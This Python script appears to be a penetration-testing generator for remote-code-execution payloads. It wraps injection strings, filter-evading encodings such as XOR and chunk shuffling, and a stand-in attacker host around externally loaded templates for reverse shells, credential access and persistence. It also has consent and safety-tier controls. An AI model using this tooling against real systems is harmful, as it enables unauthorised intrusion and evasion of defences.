import argparse
import base64
import codecs
import json
import logging
import random
import string
import sys
import urllib.parse
from dataclasses import asdict, dataclass
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, Iterator, List, Optional, Set, Tuple

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("rce_generator.log"),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

SAFETY_ORDER = {"safe": 0, "intrusive": 1, "stateful": 2}


@dataclass(frozen=True)
class PayloadRecord:
    payload: str
    mode: str
    category: str
    environment: str
    context: str
    encoding: str
    sink: Optional[str]
    indicator: str
    safety: str
    expected_channel: str
    runner: Optional[str]
    tags: Tuple[str, ...] = ()
    notes: Tuple[str, ...] = ()
    blocking: bool = False
    stateful: bool = False

class RCEPayloadGenerator:
    def __init__(
        self,
        attacker_ip: str = "192.168.1.100",
        attacker_domain: str = "attacker.com",
        template_path: Optional[Path] = None,
    ):
        self.attacker_ip = attacker_ip
        self.attacker_domain = attacker_domain
        self.template_path = template_path or Path(__file__).parent / "templates" / "payloads.json"
        self.setup_components()

    def setup_components(self):
        """Initialize all payload components"""
        # Context-specific wrappers for different injection points
        self.contexts = {
            "raw": {"prefix": "", "suffix": ""},
            "html": {"prefix": "", "suffix": ""},
            "attribute": {"prefix": "\"", "suffix": "\""},
            "javascript": {"prefix": "';", "suffix": ";//"},
            "sql": {"prefix": "';", "suffix": "-- "},
            "php": {"prefix": "<?php ", "suffix": "?>"},
            "unix_shell": {"prefix": "", "suffix": ""},
            "windows_cmd": {"prefix": "", "suffix": ""},
            "powershell": {"prefix": "", "suffix": ""},
        }
        self.separator_envs = {"unix", "windows", "docker", "kubernetes"}
        self.safe_detection_encodings = ["none", "url_encode", "double_url_encode"]

        # Command separators and chainers for different environments
        self.separators = {
            "unix": ["; ", "| ", "|| ", "& ", "&& ", "%0a", "%0A", "${IFS}", "\\n"],
            "windows": ["&", "|", "%26", "%7C", "`|", "`&"],
            "docker": ["; ", "&& ", "| "],
            "kubernetes": ["; ", "&& "],
        }

        # Sink-specific constraints (forbidden chars, requirements)
        self.sink_constraints: Dict[str, Dict[str, Any]] = {
            # General OS command sinks
            "unix_os_command": {"forbidden_chars": [";", "|", "&", "`", "(", ")"], "requires_quotes": False},
            "windows_os_command": {"forbidden_chars": ["&", "|", "^", "<", ">"], "requires_quotes": False},
            # Node.js sinks
            "nodejs_child_process_exec": {"forbidden_chars": [";", "|"], "requires_quotes": True},
            "nodejs_pug_ssti": {"forbidden_chars": ["{{", "}}"], "requires_quotes": False},
            "nodejs_ejs_ssti": {"forbidden_chars": ["<%", "%>"], "requires_quotes": False},
            "nodejs_handlebars_ssti": {"forbidden_chars": ["{{", "}}"], "requires_quotes": False},
            # Python sinks
            "python_os_system": {"forbidden_chars": [";", "|"], "requires_quotes": True},
            "python_jinja2_ssti": {"forbidden_chars": ["{{", "}}"], "requires_quotes": False},
            # PHP sinks
            "php_exec_system": {"forbidden_chars": [";", "|"], "requires_quotes": True},
            "php_deserialize": {"forbidden_chars": [], "requires_quotes": False},
            "php_eval": {"forbidden_chars": [], "requires_quotes": False},
            # Java sinks
            "java_runtime_exec": {"forbidden_chars": [";", "|"], "requires_quotes": True},
            "java_freemarker_ssti": {"forbidden_chars": ["${", "}"], "requires_quotes": False},
            "java_velocity_ssti": {"forbidden_chars": ["#", "$"], "requires_quotes": False},
            "java_thymeleaf_ssti": {"forbidden_chars": ["[[", "]]"], "requires_quotes": False},
            "java_deserialization": {"forbidden_chars": [], "requires_quotes": False},
            "java_expression": {"forbidden_chars": [], "requires_quotes": False},
            # .NET sinks
            "dotnet_process_start": {"forbidden_chars": ["&", "|"], "requires_quotes": True},
            "dotnet_deserialize": {"forbidden_chars": [], "requires_quotes": False},
            # Ruby sinks
            "ruby_kernel_system": {"forbidden_chars": [";", "|"], "requires_quotes": True},
            "ruby_erb_ssti": {"forbidden_chars": ["<%", "%>"], "requires_quotes": False},
            # Perl sinks
            "perl_system_backticks": {"forbidden_chars": [";", "|"], "requires_quotes": True},
            # Go sinks
            "go_os_exec": {"forbidden_chars": [";", "|"], "requires_quotes": True},
            # Node sinks
            "nodejs_vm_eval": {"forbidden_chars": [], "requires_quotes": False},
            "nodejs_deserialization": {"forbidden_chars": [], "requires_quotes": False},
        }

        self.payload_categories: Dict[str, Any] = {}
        self.detection_payloads: Dict[str, List[str]] = {}
        self._load_template_payloads()

        # Encoding and obfuscation techniques
        self.encoding_methods = {
            "none": lambda x: x,
            "url_encode": lambda x: urllib.parse.quote(x),
            "double_url_encode": lambda x: urllib.parse.quote(urllib.parse.quote(x)),
            "base64": lambda x: base64.b64encode(x.encode()).decode(),
            "hex": lambda x: x.encode().hex(),
            "rot13": lambda x: codecs.encode(x, 'rot13'),
            "random_case": lambda x: ''.join(random.choice([c.upper(), c.lower()]) for c in x),
            "insert_special_chars": lambda x: self.insert_special_chars(x, 0.1),
            "base64_then_url": lambda x: urllib.parse.quote(base64.b64encode(x.encode()).decode()),
            "rot13_then_base64": lambda x: base64.b64encode(codecs.encode(x, 'rot13').encode()).decode(),
            "double_base64": lambda x: base64.b64encode(base64.b64encode(x.encode())).decode(),
            "xor_polymorphic": self.xor_polymorphic_encode,
            "chunk_shuffle": self.chunk_shuffle_encode,
        }

    def _load_template_payloads(self) -> None:
        """Load payload templates from JSON/YAML files."""
        if not self.template_path.exists():
            logger.warning("Template file %s not found. Using fallback templates.", self.template_path)
            self.payload_categories = {}
            self.detection_payloads = {}
            return

        try:
            with open(self.template_path, "r", encoding="utf-8") as template_file:
                content = template_file.read()

            if self.template_path.suffix in {".yml", ".yaml"}:
                try:
                    import yaml  # type: ignore

                    data = yaml.safe_load(content)
                except Exception as exc:  # pragma: no cover - optional dependency
                    logger.error("Failed to parse YAML template %s: %s", self.template_path, exc)
                    raise
            else:
                data = json.loads(content)

            self.payload_categories = data.get("payload_categories", {})
            self.detection_payloads = data.get("detection_payloads", {})
        except Exception as exc:
            logger.error("Unable to load payload templates: %s", exc)
            self.payload_categories = {}
            self.detection_payloads = {}

    def insert_special_chars(self, s: str, frequency: float = 0.1) -> str:
        """Insert special characters randomly"""
        special_chars = ['%00', '%0a', '%0d', '%09', '%20', '%0b', '%0c']
        result = []
        for char in s:
            if random.random() < frequency:
                result.append(random.choice(special_chars))
            result.append(char)
        return ''.join(result)

    def xor_polymorphic_encode(self, payload: str) -> str:
        """Apply a simple XOR obfuscation with a random key and annotate the output."""
        key = random.randint(1, 255)
        encoded = ''.join(f"{ord(char) ^ key:02x}" for char in payload)
        return f"XOR({key}):{encoded}"

    def chunk_shuffle_encode(self, payload: str, chunk_size: int = 3) -> str:
        """Split the payload into chunks and shuffle them to create polymorphic variants."""
        if len(payload) <= chunk_size:
            return payload

        chunks = [payload[i:i + chunk_size] for i in range(0, len(payload), chunk_size)]
        random.shuffle(chunks)
        shuffled = ''.join(chunks)
        return f"shuffle::{shuffled}"

    def apply_constraints(self, payload: str, sink: str) -> str:
        """Apply sink-specific constraints to payload"""
        if sink not in self.sink_constraints:
            return payload
        
        constraints = self.sink_constraints[sink]
        forbidden = constraints.get('forbidden_chars', [])
        
        # Simple replacement for forbidden chars (e.g., encode them)
        for char in forbidden:
            if char in payload:
                # Replace with URL-encoded version as example
                payload = payload.replace(char, urllib.parse.quote(char))
        
        if constraints.get('requires_quotes', False):
            payload = f'"{payload}"'

        return payload

    def apply_watermark(self, payload: str, env: str, context_name: str, marker: str) -> str:
        """Embed a watermark comment or command into generated payloads where feasible."""
        watermark_token = f"RCEPayloadGen-ID:{marker}"

        if context_name == "attribute":
            logger.debug("Skipping watermark injection for attribute context due to quoting constraints.")
            return payload

        if env == "windows":
            return f"{payload} & REM {watermark_token}"
        if env in {"unix", "docker", "kubernetes"}:
            return f"{payload} ;# {watermark_token}"
        if env == "php":
            return f"{payload};/* {watermark_token} */"
        if env in {"python", "ruby", "perl"}:
            return f"{payload}  # {watermark_token}"
        if env in {"nodejs", "javascript"}:
            return f"{payload} // {watermark_token}"
        if env in {"java", "dotnet", "go"}:
            return f"{payload} /* {watermark_token} */"

        return f"{payload} /* {watermark_token} */"

    def _normalize_entry(self, entry: Any) -> Dict[str, Any]:
        if isinstance(entry, str):
            return {"payload": entry}
        if isinstance(entry, dict):
            return dict(entry)
        raise TypeError(f"Unsupported payload entry type: {type(entry)!r}")

    def _infer_runner(self, payload: str, env: str, sink: Optional[str]) -> Optional[str]:
        lower_payload = payload.lower()
        if "powershell" in lower_payload or "get-netipconfiguration" in lower_payload:
            return "powershell"

        runners = {
            "unix": "sh",
            "windows": "cmd",
            "nodejs": "node",
            "python": "python",
            "php": "php",
            "java": "java",
            "dotnet": "dotnet",
            "ruby": "ruby",
            "perl": "perl",
            "go": "go",
            "javascript": "javascript",
            "docker": "sh",
            "kubernetes": "kubectl",
            "sql": "sql",
            "powershell": "powershell",
        }
        if sink and "ssti" in sink:
            return f"{env}_template"
        return runners.get(env)

    def _infer_expected_channel(self, payload: str, category_name: str, mode: str) -> str:
        lower_payload = payload.lower()
        if mode == "detection" and any(token in lower_payload for token in ["sleep", "timeout", "start-sleep"]):
            return "timing"
        if any(token in lower_payload for token in ["curl ", "wget ", "invoke-webrequest", "invoke-restmethod", "resolve-dnsname", "tcpclient"]):
            return "network"
        if any(token in lower_payload for token in ["console.error", "system.err", "error_log"]):
            return "stderr"
        if category_name in {"reverse_shells", "download_execute", "lateral_movement"}:
            return "network"
        return "response"

    def _infer_indicator(self, payload: str, category_name: str, env: str, mode: str) -> str:
        lower_payload = payload.lower()
        if mode == "detection":
            if any(token in lower_payload for token in ["{canary}", "detection_", "health_", "det:"]):
                return "Look for the generated canary token in the response body, stdout, stderr, or application logs."
            if any(token in lower_payload for token in ["sleep", "timeout", "start-sleep"]):
                return "Look for a reproducible response delay compared with baseline requests."
            if any(token in lower_payload for token in ["kubectl", "curl ", "wget ", "invoke-webrequest", "resolve-dnsname"]):
                return "Look for an authorized network, control-plane, or audit observable in your monitoring sink."
            return "Look for a benign execution marker in the response, logs, or telemetry pipeline."

        category_indicators = {
            "basic_enum": "Expect identity, host, process, or OS inventory data in the response or logs.",
            "file_operations": "Expect file content, directory listings, or permission errors that prove filesystem reachability.",
            "network_operations": "Expect network configuration data or an authorized outbound lookup in your monitoring sink.",
            "code_execution": "Expect proof that the runtime evaluated the snippet, such as command output or a rendered value.",
            "download_execute": "Expect an authorized outbound retrieval event or related telemetry in your monitoring sink.",
            "reverse_shells": "Expect an authorized out-of-band callback or connection attempt in your monitoring sink.",
            "credential_access": "Expect secret material, access-denied responses, or credential-store access telemetry.",
            "privilege_escalation": "Expect privilege inventory, group membership, capability listings, or access-denied signals.",
            "persistence": "Expect a durable artifact or configuration mutation only on an isolated lab target.",
            "cloud_metadata": "Expect metadata documents, cloud identity details, or blocked-access telemetry.",
            "database_enumeration": "Expect schema names, database inventory, or permission errors that confirm DB reachability.",
            "lateral_movement": "Expect an authorized remote-management event, connection attempt, or access-denied telemetry.",
            "container_escape": "Expect evidence of host boundary visibility, namespace access, or orchestrator privilege exposure.",
        }
        return category_indicators.get(category_name, f"Expect a controlled {env} execution observable in the response or logs.")

    def _is_blocking(self, payload: str) -> bool:
        lower_payload = payload.lower()
        return any(token in lower_payload for token in ["tail -f", "sleep ", "timeout /t", "start-sleep", "readline()", "while(($i ="])

    def _is_stateful(self, payload: str) -> bool:
        lower_payload = payload.lower()
        return any(
            token in lower_payload
            for token in [
                "crontab",
                "reg add",
                "schtasks",
                "new-itemproperty",
                "set-mppreference",
                "copy ",
                "chmod +x",
                "out-file",
                "kubectl run",
                "docker run",
                "tar -cf",
                ">>",
            ]
        )

    def _classify_safety(self, payload: str, category_name: str, mode: str) -> str:
        lower_payload = payload.lower()
        if self._is_stateful(payload) or category_name == "persistence":
            return "stateful"
        if self._is_blocking(payload):
            return "intrusive"
        if any(token in lower_payload for token in ["curl ", "wget ", "invoke-webrequest", "invoke-restmethod", "ssh ", "scp ", "winrs ", "psexec", "kubectl ", "docker run", "nsenter", "tcpclient", "fsockopen"]):
            return "intrusive"
        if mode == "detection":
            return "safe"
        if category_name in {"reverse_shells", "download_execute", "credential_access", "container_escape", "lateral_movement"}:
            return "intrusive"
        return "safe"

    def _lint_payload(self, payload: str, env: str) -> List[str]:
        lower_payload = payload.lower()
        notes: List[str] = []
        if env == "windows" and payload.strip() == "Get-NetIPConfiguration":
            notes.append("Requires a PowerShell execution surface rather than plain cmd.exe.")
        if env == "python" and "subprocess.call([" in payload and "shell=True" in payload:
            notes.append("Uses shell=True with a list argument; validate runtime semantics before relying on this variant.")
        if env == "java" and "command('bash'" in payload:
            notes.append("Contains Java-style code with single-quoted strings; validate syntax before operational use.")
        if env == "go" and "exec.command('" in lower_payload:
            notes.append("Contains Go-style code with single-quoted strings; validate syntax before operational use.")
        if "process.mainmodule" in lower_payload:
            notes.append("Relies on legacy Node.js process.mainModule behavior that may be absent in newer runtimes.")
        if "nc -e " in lower_payload:
            notes.append("Requires a netcat build that supports -e; many modern distributions disable this flag.")
        return notes

    def _requires_raw_context(self, env: str) -> bool:
        return env in {"python", "php", "java", "dotnet", "ruby", "perl", "go", "nodejs", "javascript", "sql"}

    def _is_context_compatible(self, context_name: str, env: str, raw_context_only: bool) -> bool:
        if context_name == "raw":
            return True
        if raw_context_only:
            if env == "php":
                return context_name == "php"
            if env in {"nodejs", "javascript"}:
                return context_name == "javascript"
            return False
        if env in {"unix", "windows", "docker", "kubernetes"}:
            return context_name in {"html", "attribute", "sql", "unix_shell", "windows_cmd", "powershell"}
        return False

    def _passes_filters(self, safety: str, blocking: bool, max_safety: str, include_blocking: bool) -> bool:
        normalized_max = max_safety if max_safety in SAFETY_ORDER else "intrusive"
        normalized_safety = safety if safety in SAFETY_ORDER else "intrusive"
        if SAFETY_ORDER[normalized_safety] > SAFETY_ORDER[normalized_max]:
            return False
        if blocking and not include_blocking:
            return False
        return True

    def _encoding_is_compatible(self, enc_name: str, runner: Optional[str]) -> bool:
        syntax_sensitive_runners = {"python", "php", "node", "javascript", "java", "dotnet", "ruby", "perl", "go", "sql"}
        if runner in syntax_sensitive_runners and enc_name in {"random_case", "insert_special_chars", "chunk_shuffle"}:
            return False
        return True

    def generate_payload_records(
        self,
        selected_contexts: Optional[List[str]] = None,
        selected_categories: Optional[List[str]] = None,
        selected_encodings: Optional[List[str]] = None,
        selected_environments: Optional[List[str]] = None,
        mode: str = "exploit",
        watermark_token: Optional[str] = None,
        max_safety: str = "intrusive",
        include_blocking: bool = False,
    ) -> Iterator[PayloadRecord]:
        generated_payloads: Set[str] = set()
        contexts = selected_contexts if selected_contexts else list(self.contexts.keys())
        encodings = selected_encodings if selected_encodings else (
            self.safe_detection_encodings if mode == "detection" else list(self.encoding_methods.keys())
        )

        if mode == "detection":
            environments = selected_environments if selected_environments else list(self.detection_payloads.keys())
            for context_name in contexts:
                if context_name not in self.contexts:
                    logger.warning("Unknown context: %s", context_name)
                    continue
                for env in environments:
                    for entry in self.detection_payloads.get(env, []):
                        base = self._normalize_entry(entry)
                        payload = str(base["payload"]).replace("{attacker_ip}", self.attacker_ip).replace("{canary}", self._generate_canary())
                        runner = base.get("runner") or self._infer_runner(payload, env, None)
                        blocking = bool(base.get("blocking", self._is_blocking(payload)))
                        safety = base.get("safety") or self._classify_safety(payload, "detection", "detection")
                        raw_context_only = bool(base.get("raw_context_only", self._requires_raw_context(env)))
                        if not self._passes_filters(safety, blocking, max_safety, include_blocking):
                            continue
                        if not self._is_context_compatible(context_name, env, raw_context_only):
                            continue
                        yield from self._encode_record_variants(
                            payload=payload,
                            context_name=context_name,
                            encodings=encodings,
                            generated_payloads=generated_payloads,
                            mode="detection",
                            category="detection",
                            environment=env,
                            sink=None,
                            indicator=base.get("indicator") or self._infer_indicator(payload, "detection", env, "detection"),
                            safety=safety,
                            expected_channel=base.get("expected_channel") or self._infer_expected_channel(payload, "detection", "detection"),
                            runner=runner,
                            tags=tuple(base.get("tags", ())),
                            notes=tuple([*base.get("notes", ()), *self._lint_payload(payload, env)]),
                            blocking=blocking,
                            stateful=bool(base.get("stateful", self._is_stateful(payload))),
                        )
            return

        categories = selected_categories if selected_categories else list(self.payload_categories.keys())
        environments = selected_environments if selected_environments else [
            "unix",
            "windows",
            "nodejs",
            "python",
            "php",
            "java",
            "dotnet",
            "ruby",
            "perl",
            "go",
            "javascript",
            "docker",
            "kubernetes",
        ]

        for context_name in contexts:
            if context_name not in self.contexts:
                logger.warning("Unknown context: %s", context_name)
                continue
            for category_name in categories:
                category = self.payload_categories.get(category_name)
                if category is None:
                    logger.warning("Unknown category: %s", category_name)
                    continue
                for env in environments:
                    if env not in category:
                        continue
                    env_payloads = category[env]
                    if isinstance(env_payloads, dict):
                        for sink, payloads in env_payloads.items():
                            sink_key = f"{env}_{sink.replace('.', '_')}"
                            for entry in payloads:
                                yield from self._build_record_set(
                                    entry=entry,
                                    category_name=category_name,
                                    env=env,
                                    sink=sink,
                                    sink_key=sink_key,
                                    context_name=context_name,
                                    encodings=encodings,
                                    generated_payloads=generated_payloads,
                                    mode=mode,
                                    watermark_token=watermark_token,
                                    max_safety=max_safety,
                                    include_blocking=include_blocking,
                                )
                    else:
                        for entry in env_payloads:
                            yield from self._build_record_set(
                                entry=entry,
                                category_name=category_name,
                                env=env,
                                sink=None,
                                sink_key=None,
                                context_name=context_name,
                                encodings=encodings,
                                generated_payloads=generated_payloads,
                                mode=mode,
                                watermark_token=watermark_token,
                                max_safety=max_safety,
                                include_blocking=include_blocking,
                            )

    def _build_record_set(
        self,
        entry: Any,
        category_name: str,
        env: str,
        sink: Optional[str],
        sink_key: Optional[str],
        context_name: str,
        encodings: List[str],
        generated_payloads: Set[str],
        mode: str,
        watermark_token: Optional[str],
        max_safety: str,
        include_blocking: bool,
    ) -> Iterator[PayloadRecord]:
        base = self._normalize_entry(entry)
        payload = str(base["payload"]).replace("{attacker_ip}", self.attacker_ip).replace("{attacker_domain}", self.attacker_domain)
        if sink_key:
            payload = self.apply_constraints(payload, sink_key)
        runner = base.get("runner") or self._infer_runner(payload, env, sink)
        blocking = bool(base.get("blocking", self._is_blocking(payload)))
        safety = base.get("safety") or self._classify_safety(payload, category_name, mode)
        raw_context_only = bool(base.get("raw_context_only", self._requires_raw_context(env)))
        if not self._passes_filters(safety, blocking, max_safety, include_blocking):
            return
        if not self._is_context_compatible(context_name, env, raw_context_only):
            return

        notes = tuple([*base.get("notes", ()), *self._lint_payload(payload, env)])
        tags = tuple(dict.fromkeys([*base.get("tags", ()), category_name, *( [sink] if sink else [] )]))
        variants = [payload]
        if env in self.separator_envs:
            variants = [f"{separator}{payload}" for separator in self.separators[env]]
            variants.append(payload)

        for variant in variants:
            final_payload = self.apply_watermark(variant, env, context_name, watermark_token) if watermark_token else variant
            yield from self._encode_record_variants(
                payload=final_payload,
                context_name=context_name,
                encodings=encodings,
                generated_payloads=generated_payloads,
                mode=mode,
                category=category_name,
                environment=env,
                sink=sink,
                indicator=base.get("indicator") or self._infer_indicator(payload, category_name, env, mode),
                safety=safety,
                expected_channel=base.get("expected_channel") or self._infer_expected_channel(payload, category_name, mode),
                runner=runner,
                tags=tags,
                notes=notes,
                blocking=blocking,
                stateful=bool(base.get("stateful", self._is_stateful(payload))),
            )

    def _encode_record_variants(
        self,
        payload: str,
        context_name: str,
        encodings: List[str],
        generated_payloads: Set[str],
        mode: str,
        category: str,
        environment: str,
        sink: Optional[str],
        indicator: str,
        safety: str,
        expected_channel: str,
        runner: Optional[str],
        tags: Tuple[str, ...],
        notes: Tuple[str, ...],
        blocking: bool,
        stateful: bool,
    ) -> Iterator[PayloadRecord]:
        context = self.contexts[context_name]
        for enc_name in encodings:
            if enc_name not in self.encoding_methods or not self._encoding_is_compatible(enc_name, runner):
                continue
            try:
                encoded_payload = self.encoding_methods[enc_name](payload)
                wrapped_payload = f"{context['prefix']}{encoded_payload}{context['suffix']}"
                if wrapped_payload in generated_payloads:
                    continue
                generated_payloads.add(wrapped_payload)

                final_notes = list(notes)
                if enc_name not in {"none", "url_encode", "double_url_encode"}:
                    final_notes.append("This encoded variant requires a decode-and-execute path before the primary indicator is observable.")

                yield PayloadRecord(
                    payload=wrapped_payload,
                    mode=mode,
                    category=category,
                    environment=environment,
                    context=context_name,
                    encoding=enc_name,
                    sink=sink,
                    indicator=indicator,
                    safety=safety if safety in SAFETY_ORDER else "intrusive",
                    expected_channel=expected_channel,
                    runner=runner,
                    tags=tags,
                    notes=tuple(dict.fromkeys(final_notes)),
                    blocking=blocking,
                    stateful=stateful,
                )
            except Exception as exc:
                logger.error("Error encoding payload with %s: %s", enc_name, exc)

    def generate_payloads(
        self,
        selected_contexts: List[str] = None,
        selected_categories: List[str] = None,
        selected_encodings: List[str] = None,
        selected_environments: List[str] = None,
        mode: str = "exploit",
        watermark_token: Optional[str] = None,
        max_safety: str = "intrusive",
        include_blocking: bool = False,
    ) -> Iterator[str]:
        """Generate payload strings while the metadata-rich path does the heavy lifting."""
        for record in self.generate_payload_records(
            selected_contexts=selected_contexts,
            selected_categories=selected_categories,
            selected_encodings=selected_encodings,
            selected_environments=selected_environments,
            mode=mode,
            watermark_token=watermark_token,
            max_safety=max_safety,
            include_blocking=include_blocking,
        ):
            yield record.payload

    def _generate_detection_payloads(
        self,
        selected_contexts: Optional[List[str]],
        selected_encodings: Optional[List[str]],
        selected_environments: Optional[List[str]],
        generated_payloads: Set[str],
    ) -> Iterator[str]:
        contexts = selected_contexts if selected_contexts else list(self.contexts.keys())
        encodings = selected_encodings if selected_encodings else list(self.encoding_methods.keys())
        environments = selected_environments if selected_environments else list(self.detection_payloads.keys())

        logger.info(
            "Generating detection payloads for contexts: %s, encodings: %s, environments: %s",
            contexts,
            encodings,
            environments,
        )

        for context_name in contexts:
            if context_name not in self.contexts:
                logger.warning("Unknown context: %s", context_name)
                continue

            context = self.contexts[context_name]

            for env in environments:
                payloads = self.detection_payloads.get(env, [])
                for base_payload in payloads:
                    formatted = base_payload.replace("{attacker_ip}", self.attacker_ip)
                    formatted = formatted.replace("{canary}", self._generate_canary())
                    for wrapped_payload in self._encode_and_wrap(
                        formatted,
                        context,
                        encodings,
                        generated_payloads,
                    ):
                        yield wrapped_payload

    def _generate_variations(
        self,
        base_payload: str,
        context: Dict[str, str],
        env: str,
        encodings: List[str],
        generated_payloads: Set[str],
        context_name: str,
        watermark_token: Optional[str],
    ) -> Iterator[str]:
        """Helper to generate payload variations with separators and encodings"""
        formatted_payload = base_payload.replace("{attacker_ip}", self.attacker_ip).replace("{attacker_domain}", self.attacker_domain)

        # Add with separators
        if env in self.separators:
            for sep in self.separators[env]:
                full_payload = f"{sep}{formatted_payload}"
                if watermark_token:
                    full_payload = self.apply_watermark(full_payload, env, context_name, watermark_token)
                for wrapped_payload in self._encode_and_wrap(full_payload, context, encodings, generated_payloads):
                    yield wrapped_payload

        # Add without separator
        base_variant = formatted_payload
        if watermark_token:
            base_variant = self.apply_watermark(base_variant, env, context_name, watermark_token)

        for wrapped_payload in self._encode_and_wrap(base_variant, context, encodings, generated_payloads):
            yield wrapped_payload

    def _encode_and_wrap(
        self,
        payload: str,
        context: Dict[str, str],
        encodings: List[str],
        generated_payloads: Set[str],
    ) -> Iterator[str]:
        """Apply encodings and context wrapping"""
        for enc_name in encodings:
            if enc_name not in self.encoding_methods:
                continue
                
            try:
                enc_func = self.encoding_methods[enc_name]
                encoded_payload = enc_func(payload)
                
                wrapped_payload = f"{context['prefix']}{encoded_payload}{context['suffix']}"
                
                if wrapped_payload not in generated_payloads:
                    generated_payloads.add(wrapped_payload)
                    yield wrapped_payload
            except Exception as e:
                logger.error(f"Error encoding payload: {e}")

    def _generate_canary(self) -> str:
        return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(6))

    def save_payloads_to_file(
        self,
        file_path: str,
        max_payloads: int = None,
        output_format: str = "text",
        include_metadata: bool = False,
        **kwargs,
    ) -> int:
        """
        Generate payloads and save them to a file

        Args:
            file_path: Path to the output file
            max_payloads: Maximum number of payloads to generate (None for unlimited)
            **kwargs: Arguments to pass to generate_payloads
            
        Returns:
            Number of payloads generated
        """
        count = 0
        output_path = Path(file_path)
        metadata_path = output_path.with_suffix(f"{output_path.suffix}.meta.jsonl")
        try:
            with output_path.open("w", encoding="utf-8") as file:
                metadata_file = metadata_path.open("w", encoding="utf-8") if include_metadata and output_format == "text" else None
                try:
                    for record in self.generate_payload_records(**kwargs):
                        serialized = json.dumps(asdict(record), ensure_ascii=True)
                        if output_format == "jsonl":
                            file.write(serialized + "\n")
                        else:
                            file.write(record.payload + "\n")
                            if metadata_file:
                                metadata_file.write(serialized + "\n")
                        count += 1
                        if max_payloads and count >= max_payloads:
                            break
                finally:
                    if metadata_file:
                        metadata_file.close()

            logger.info("Successfully generated %s payloads to %s", count, output_path)
            if include_metadata and output_format == "text":
                logger.info("Metadata sidecar written to %s", metadata_path)
        except Exception as e:
            logger.error(f"Error writing to file {output_path}: {e}")

        return count

    def log_exploitation_usage(self, watermark_token: str, arguments: argparse.Namespace) -> None:
        audit_path = Path("exploit_audit.log")
        try:
            with audit_path.open("a", encoding="utf-8") as audit_file:
                timestamp = datetime.now(timezone.utc).isoformat()
                audit_file.write(
                    f"{timestamp} | token={watermark_token} | ip={self.attacker_ip} | domain={self.attacker_domain} | args={vars(arguments)}\n"
                )
        except Exception as exc:
            logger.error("Unable to log exploitation usage: %s", exc)

def main():
    parser = argparse.ArgumentParser(description="Generate RCE payloads for penetration testing")
    parser.add_argument("-o", "--output", default="rce_payloads.txt",
                       help="Output file path (default: rce_payloads.txt)")
    parser.add_argument("--attacker-ip", default="192.168.1.100",
                       help="Attacker IP for reverse shells (default: 192.168.1.100)")
    parser.add_argument("--attacker-domain", default="attacker.com",
                       help="Attacker domain for download payloads (default: attacker.com)")
    parser.add_argument("--max-payloads", type=int, default=None,
                       help="Maximum number of payloads to generate (default: unlimited)")
    parser.add_argument("--contexts", nargs="+", default=None,
                       help="Contexts to generate, including raw (default: all compatible contexts)")
    parser.add_argument("--categories", nargs="+", default=None,
                       help="Categories to generate (default: all)")
    parser.add_argument("--encodings", nargs="+", default=None,
                       help="Encoding methods to apply (default: mode-specific)")
    parser.add_argument("--environments", nargs="+", default=None,
                       help="Environments to generate (default: all)")
    parser.add_argument("--template-file", type=str, default=None,
                        help="Path to a custom payload template file (JSON or YAML)")
    parser.add_argument("--detection-only", action="store_true",
                        help="Generate benign payloads for detection and validation")
    parser.add_argument("--output-format", choices=["text", "jsonl"], default="text",
                        help="Output payloads as plain text or JSONL records")
    parser.add_argument("--include-metadata", action="store_true",
                        help="Write indicator and safety metadata alongside payload output")
    parser.add_argument("--max-safety", choices=["safe", "intrusive", "stateful"], default=None,
                        help="Highest safety tier to include")
    parser.add_argument("--include-blocking", action="store_true",
                        help="Include blocking or timing-based payloads that are excluded by default")
    parser.add_argument("--acknowledge-consent", action="store_true",
                        help="Acknowledge that exploitation payloads will only be used with proper authorization")

    args = parser.parse_args()

    template_path = Path(args.template_file) if args.template_file else None
    # Initialize generator
    generator = RCEPayloadGenerator(
        attacker_ip=args.attacker_ip,
        attacker_domain=args.attacker_domain,
        template_path=template_path,
    )

    mode = "detection" if args.detection_only else "exploit"

    if mode == "exploit" and not args.acknowledge_consent:
        print("[!] Exploitation mode requires explicit consent. Re-run with --acknowledge-consent after confirming authorization.")
        return

    watermark_token = None
    if mode == "exploit":
        watermark_token = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
        generator.log_exploitation_usage(watermark_token, args)

    max_safety = args.max_safety or ("safe" if mode == "detection" else "intrusive")
    count = generator.save_payloads_to_file(
        file_path=args.output,
        max_payloads=args.max_payloads,
        output_format=args.output_format,
        include_metadata=args.include_metadata or args.output_format == "jsonl",
        selected_contexts=args.contexts,
        selected_categories=args.categories,
        selected_encodings=args.encodings,
        selected_environments=args.environments,
        mode=mode,
        watermark_token=watermark_token,
        max_safety=max_safety,
        include_blocking=args.include_blocking,
    )

    print(f"Generated {count} payloads to {args.output} in {mode} mode")

if __name__ == "__main__":
    main()
